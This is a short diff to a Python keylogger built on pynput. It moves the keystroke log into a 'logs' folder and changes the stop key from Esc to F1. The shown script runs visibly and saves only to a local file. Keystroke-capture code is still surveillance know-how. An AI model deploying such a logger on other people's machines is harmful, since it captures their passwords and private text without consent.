@@ -1,9 +1,11 @@
 import pynput
 from pynput.keyboard import Key, Listener
 from datetime import datetime
+import os
 
 # Configuration
-LOG_FILE = "log.txt"
+LOG_FOLDER = "logs"
+LOG_FILE = os.path.join(LOG_FOLDER, "log.txt")
 
 def format_key(key):
     """Format key for better readability"""
@@ -51,7 +53,7 @@ def write_file(key):
 
 def on_release(key):
     """Handle key release events"""
-    if key == Key.esc:
+    if key == Key.f1:    # here to change the stop key current key is f1
         print("\n" + "="*50)
         print("KeyLogger stopped!")
         print(f"Log saved to: {LOG_FILE}")
@@ -60,6 +62,9 @@ def on_release(key):
 
 def main():
     """Main function to start keylogger"""
+    # Create logs folder if it doesn't exist
+    os.makedirs(LOG_FOLDER, exist_ok=True)
+    
     # Create session header with timestamp
     try:
         with open(LOG_FILE, 'a', encoding='utf-8') as f:
